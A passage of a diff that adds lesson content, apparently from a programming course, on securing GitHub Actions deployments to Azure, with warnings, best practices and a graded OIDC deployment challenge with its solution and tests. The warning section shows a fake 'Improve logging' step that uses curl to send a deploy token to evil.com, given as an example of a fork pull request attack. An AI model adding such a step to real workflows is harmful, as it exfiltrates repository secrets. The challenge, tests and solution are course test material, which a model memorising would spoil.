\\\n            --name shopflow-prod-pg \\\n            --admin-user pgadmin \\\n            --admin-password \"${{ secrets.PG_ADMIN_PASSWORD }}\" \\\n            --query \"ALTER USER shopflow_app PASSWORD '$NEW_PASSWORD';\"\n          \n          # Update in Key Vault\n          az keyvault secret set \\\n            --vault-name shopflow-prod-kv \\\n            --name database-password \\\n            --value \"$NEW_PASSWORD\"\n          \n          # Restart app to pick up new connection string\n          az containerapp revision restart \\\n            --name ${{ env.AZURE_CONTAINER_APP }} \\\n            --resource-group ${{ env.AZURE_RESOURCE_GROUP }}\n          \n          echo \"Database password rotated successfully\"",
+              "language": "yaml"
+            },
+            {
+              "type": "WARNING",
+              "title": "CI/CD Security Risks",
+              "content": "## Secret Exposure in Logs\n\nThe most common security failure is accidentally printing secrets to workflow logs. GitHub masks secrets referenced directly, but secrets passed through variables, files, or command outputs can leak.\n\n**Dangerous patterns:**\n```yaml\n# DANGER: Echoes the secret to logs\n- run: echo \"Database URL is ${{ secrets.DATABASE_URL }}\"\n\n# DANGER: Variable interpolation in connection string\n- run: |\n    CONNECTION=\"Server=prod;Password=${{ secrets.DB_PASSWORD }}\"\n    echo \"Connecting with: $CONNECTION\"  # Leaks password!\n\n# DANGER: Debug output that includes environment\n- run: env | sort  # Prints all env vars including secrets!\n\n# DANGER: Error messages that include credentials\n- run: curl https://user:${{ secrets.API_KEY }}@api.example.com || true\n  # Failed curl shows URL with credentials in error output\n```\n\n**Safe patterns:**\n```yaml\n# SAFE: Use add-mask for dynamic secrets\n- run: |\n    TOKEN=$(some-command-that-returns-secret)\n    echo \"::add-mask::$TOKEN\"\n    use-token \"$TOKEN\"\n\n# SAFE: Never echo, just use\n- run: |\n    curl -H \"Authorization: Bearer ${{ secrets.API_KEY }}\" \\\n      https://api.example.com/data\n```\n\n## Fork Pull Request Attacks\n\nWhen someone forks your repository and creates a pull request, their workflow modifications run in your repository context. A malicious PR could modify the workflow to exfiltrate secrets:\n\n```yaml\n# Malicious PR adds this step\n- name: \"Improve logging\"\n  run: |\n    curl -X POST https://evil.com/steal \\\n      -d \"token=${{ secrets.DEPLOY_TOKEN }}\"\n```\n\n**Mitigations:**\n1. Use `pull_request_target` carefully - it runs with repository secrets\n2. Require approval for first-time contributors\n3. Never use secrets in `pull_request` events from forks\n4. Use environment protection rules requiring manual approval\n\n## Supply Chain Vulnerabilities\n\nGitHub Actions you reference are code that runs with your secrets:\n\n```yaml\n# This action has full access to your secrets!\n- uses: random-author/cool-action@main\n```\n\n**Risks:**\n- Action author could be compromised\n- `@main` means you run whatever code is currently there\n- Transitive dependencies in actions can be vulnerable\n\n**Mitigations:**\n```yaml\n# Pin to specific commit SHA\n- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11\n\n# Or use verified/official actions only\n- uses: actions/checkout@v4  # GitHub-verified\n\n# Audit action source code before using\n# Check for data exfiltration, network calls to unknown hosts\n```\n\n## Compromised Dependencies\n\nYour application dependencies can be compromised. A malicious package update could:\n- Steal environment variables during build\n- Inject malware into your built application\n- Exfiltrate source code during `npm install` or `dotnet restore`\n\n**Mitigations:**\n1. Use lock files (`package-lock.json`, `packages.lock.json`)\n2. Enable Dependabot security updates\n3. Scan dependencies: `dotnet list package --vulnerable`\n4. Use private package feeds for critical dependencies\n5. Monitor for typosquatting attacks on package names\n\n## Privilege Escalation\n\nOverly permissive workflow permissions enable attacks:\n\n```yaml\n# DANGER: Full repository access for a simple build\npermissions: write-all\n\n# BETTER: Minimal required permissions\npermissions:\n  contents: read\n  packages: write\n```\n\nA compromised step with `write-all` could push malicious code, delete branches, or modify releases. Always use the principle of least privilege."
+            },
+            {
+              "type": "THEORY",
+              "title": "Security Best Practices",
+              "content": "## Principle of Least Privilege\n\nEvery workflow, job, and step should have only the permissions it absolutely needs. GitHub Actions defaults to read-only permissions when you explicitly set any permission, which is the safest baseline.\n\n```yaml\n# Explicitly declare only needed permissions\npermissions:\n  contents: read     # Read repository code\n  packages: write    # Push container images\n  id-token: write    # Use OIDC authentication\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read   # Job-level override: even more restrictive\n```\n\nFor secrets, create separate credentials for each environment. The development database password should not work in production. Even within production, consider separate credentials for read-only operations versus write operations.\n\n## OpenID Connect (OIDC) Authentication\n\nOIDC eliminates long-lived credentials entirely. Instead of storing a service principal password that never expires, your workflow proves its identity to the cloud provider using GitHub's identity token.\n\n**Traditional (risky):** Store Azure service principal password in GitHub Secrets. Password never expires, if leaked, attacker has permanent access.\n\n**OIDC (recommended):** Configure Azure to trust tokens from your specific GitHub repository, branch, and environment. Each workflow run receives a short-lived token valid for only that run.\n\n```yaml\n# Azure OIDC configuration\npermissions:\n  id-token: write  # Required to request OIDC token\n\n- uses: azure/login@v2\n  with:\n    client-id: ${{ secrets.AZURE_CLIENT_ID }}      # Identifier, not secret\n    tenant-id: ${{ secrets.AZURE_TENANT_ID }}      # Identifier, not secret  \n    subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}  # Identifier\n    # No client-secret needed!\n```\n\n## Secret Rotation\n\nSecrets should be rotated regularly:\n- API keys: Every 90 days\n- Database passwords: Every 90 days\n- Service account credentials: Every 30 days\n- Emergency rotation: Immediately if compromise suspected\n\nAutomate rotation to make it painless:\n1. Generate new secret\n2. Update in secret store (Key Vault)\n3. Restart application to pick up new value\n4. Verify application works with new secret\n5. Keep old secret valid briefly for in-flight requests\n6. Delete old secret\n\n## Audit Logging\n\nMaintain comprehensive logs of secret access and deployment activities:\n- Which workflow accessed which secrets\n- Who triggered deployments\n- What exactly was deployed (commit SHA, image digest)\n- Environment and timestamp of every deployment\n\n```yaml\n- name: Create audit record\n  run: |\n    az monitor log-analytics workspace query \\\n      --workspace ${{ secrets.LOG_ANALYTICS_ID }} \\\n      --analytics-query \"AuditLogs | where TimeGenerated > ago(1h)\" \\\n      --output table\n    \n    echo \"Deployment audit:\"\n    echo \"  Repository: ${{ github.repository }}\"\n    echo \"  Commit: ${{ github.sha }}\"\n    echo \"  Actor: ${{ github.actor }}\"\n    echo \"  Environment: production\"\n    echo \"  Timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)\"\n```\n\n## Environment Isolation\n\nNever share credentials between environments. A compromised development environment should not enable access to production:\n\n| Resource | Development | Staging | Production |\n|----------|-------------|---------|------------|\n| Database | dev-shopflow.postgres | staging-shopflow.postgres | prod-shopflow.postgres |\n| Azure Subscription | Dev Sub | Staging Sub | Prod Sub |\n| Key Vault | shopflow-dev-kv | shopflow-staging-kv | shopflow-prod-kv |\n| Service Principal | sp-shopflow-dev | sp-shopflow-staging | sp-shopflow-prod |\n\nUse GitHub Environments to scope secrets. Production secrets are only available to jobs that specify `environment: production`, and production environments should require manual approval from authorized reviewers.\n\n## Dependency Security\n\nLock dependencies to prevent supply chain attacks:\n```bash\n# Create lock file\ndotnet restore --locked-mode\n\n# Audit for vulnerabilities\ndotnet list package --vulnerable --include-transitive\n```\n\nUse Dependabot for automated security updates and review dependency changes carefully in pull requests."
+            }
+          ],
+          "challenges": [
+            {
+              "type": "FREE_CODING",
+              "id": "lesson-24-05-challenge-01",
+              "title": "Implement Secure Cloud Deployment with OIDC",
+              "description": "Configure a secure deployment workflow using OIDC authentication and proper secret management.",
+              "instructions": "Implement secure cloud deployment for ShopFlow!\n\n1. Configure OIDC authentication:\n   - Set id-token permission to write\n   - Use azure/login with OIDC (no client secret)\n\n2. Implement proper secret handling:\n   - Fetch secrets from Key Vault at runtime\n   - Use add-mask for dynamic secrets\n   - Never echo secrets to logs\n\n3. Add security scanning:\n   - Scan for vulnerable packages before deploy\n   - Fail the workflow if critical vulnerabilities found\n\n4. Create audit logging:\n   - Log who triggered the deployment\n   - Log what commit/image was deployed\n   - Log timestamp of deployment",
+              "starterCode": "# Implement secure deployment with OIDC\n\nname: Secure Deploy\n\non:\n  push:\n    branches: [main]\n\n# TODO: Set minimal required permissions including id-token for OIDC\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    environment: production\n    \n    steps:\n      - uses: actions/checkout@v4\n      \n      # TODO: Add Azure login with OIDC (no client secret)\n      # Use azure/login@v2\n      # Hint: Only need client-id, tenant-id, subscription-id\n      \n      # TODO: Scan for vulnerable packages\n      # Use: dotnet list package --vulnerable\n      # Fail if vulnerabilities found\n      \n      # TODO: Fetch secrets from Key Vault\n      # Use: az keyvault secret show\n      # Mask the secret with add-mask\n      \n      # TODO: Deploy with fetched secrets\n      # Update container app with secret reference\n      \n      # TODO: Create audit log\n      # Log: actor, commit, timestamp, environment",
+              "solution": "# Implement secure deployment with OIDC\n\nname: Secure Deploy\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n  packages: write\n  id-token: write\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    environment: production\n    \n    steps:\n      - uses: actions/checkout@v4\n      \n      - name: Setup .NET\n        uses: actions/setup-dotnet@v4\n        with:\n          dotnet-version: '9.0.x'\n      \n      - name: Azure login with OIDC\n        uses: azure/login@v2\n        with:\n          client-id: ${{ secrets.AZURE_CLIENT_ID }}\n          tenant-id: ${{ secrets.AZURE_TENANT_ID }}\n          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}\n      \n      - name: Scan for vulnerable packages\n        run: |\n          dotnet restore\n          VULN_OUTPUT=$(dotnet list package --vulnerable 2>&1)\n          echo \"$VULN_OUTPUT\"\n          \n          if echo \"$VULN_OUTPUT\" | grep -q \"has the following vulnerable packages\"; then\n            echo \"::error::Critical vulnerabilities detected!\"\n            exit 1\n          fi\n          echo \"No vulnerabilities found\"\n      \n      - name: Fetch secrets from Key Vault\n        id: secrets\n        run: |\n          # Fetch database connection string\n          DB_SECRET=$(az keyvault secret show \\\n            --vault-name shopflow-prod-kv \\\n            --name database-connection \\\n            --query value -o tsv)\n          echo \"::add-mask::$DB_SECRET\"\n          \n          # Fetch API key\n          API_KEY=$(az keyvault secret show \\\n            --vault-name shopflow-prod-kv \\\n            --name stripe-api-key \\\n            --query value -o tsv)\n          echo \"::add-mask::$API_KEY\"\n          \n          # Store for next step (masked in logs)\n          echo \"db-secret=$DB_SECRET\" >> $GITHUB_OUTPUT\n          echo \"api-key=$API_KEY\" >> $GITHUB_OUTPUT\n      \n      - name: Deploy to Container Apps\n        run: |\n          # Update secrets in container app\n          az containerapp secret set \\\n            --name shopflow-api \\\n            --resource-group shopflow-prod-rg \\\n            --secrets \\\n              database-url=\"${{ steps.secrets.outputs.db-secret }}\" \\\n              stripe-key=\"${{ steps.secrets.outputs.api-key }}\"\n          \n          # Deploy new image\n          az containerapp update \\\n            --name shopflow-api \\\n            --resource-group shopflow-prod-rg \\\n            --image ghcr.io/${{ github.repository }}:${{ github.sha }}\n      \n      - name: Create audit log\n        run: |\n          TIMESTAMP=$(date -u +%Y-%m-%dT%H:%M:%SZ)\n          \n          echo \"========== DEPLOYMENT AUDIT ==========\"\n          echo \"Timestamp: $TIMESTAMP\"\n          echo \"Actor: ${{ github.actor }}\"\n          echo \"Repository: ${{ github.repository }}\"\n          echo \"Commit: ${{ github.sha }}\"\n          echo \"Environment: production\"\n          echo \"Trigger: ${{ github.event_name }}\"\n          echo \"=======================================\"\n          \n          # In production, send to logging service\n          # az monitor log-analytics workspace ...",
+              "language": "yaml",
+              "testCases": [
+                {
+                  "id": "test-1",
+                  "description": "Should set id-token permission for OIDC",
+                  "expectedOutput": "id-token: write",
+                  "isVisible": true
+                },
+                {
+                  "id": "test-2",
+                  "description": "Should use azure/login without client-secret",
+                  "expectedOutput": "azure/login@v2",
+                  "isVisible": true
+                },
+                {
+                  "id": "test-3",
+                  "description": "Should scan for vulnerabilities",
+                  "expectedOutput": "--vulnerable",
+                  "isVisible": true
+                },
+                {
+                  "id": "test-4",
+                  "description": "Should use add-mask for secrets",
+                  "expectedOutput": "::add-mask::",
+                  "isVisible": true
+                },
+                {
+                  "id": "test-5",
+                  "description": "Should fetch from Key Vault",
+                  "expectedOutput": "az keyvault secret show",
+                  "isVisible": true
+                },
+                {
+                  "id": "test-6",
+                  "description": "Should create audit log with actor",
+                  "expectedOutput": "github.actor",
+                  "isVisible": true
+                }
+              ],
+              "hints": [
+                {
+                  "level": 1,
+                  "text": "OIDC requires 'id-token: write' in the permissions block at the workflow level."
+                },
+                {
+                  "level": 2,
+                  "text": "azure/login@v2 with OIDC only needs client-id, tenant-id, and subscription-id - no client-secret."
+                },
+                {
+                  "level": 3,
+                  "text": "Use 'dotnet list package --vulnerable' and grep for 'vulnerable packages' to detect issues."
+                },
+                {
+                  "level": 4,
+                  "text": "Always use 'echo \"::add-mask::$SECRET\"' BEFORE using the secret in any command."
+                },
+                {
+                  "level": 5,
+                  "text": "Use 'az keyvault secret show --query value -o tsv' to get just the secret value."
+                }
+              ],
+              "commonMistakes": [
+                {
+                  "mistake": "Including client-secret with OIDC login",
+                  "consequence": "Defeats the purpose of OIDC by requiring a stored secret. OIDC should be secretless.",
+                  "correction": "Remove client-secret parameter. OIDC uses the GitHub-issued token instead."
+                },
+                {
+                  "mistake": "Not masking secrets fetched from Key Vault",
+                  "consequence": "Secrets appear in plain text in workflow logs, potentially exposing them.",
+                  "correction": "Always run 'echo \"::add-mask::$SECRET\"' immediately after fetching a secret."
+                },
+                {
+                  "mistake": "Using write-all permissions",
+                  "consequence": "Over-privileged workflow can cause more damage if compromised.",
+                  "correction": "Explicitly list only required permissions: contents:read, packages:write, id-token:write."
+                },
+                {
+                  "mistake": "Scanning after deployment",
+                  "consequence": "Vulnerable code gets deployed before vulnerabilities are detected.",
+                  "correction": "Run vulnerability scan before any deployment steps, and fail fast if issues found."
+                }
+              ],
+              "difficulty": "advanced"
             }
           ]
         }
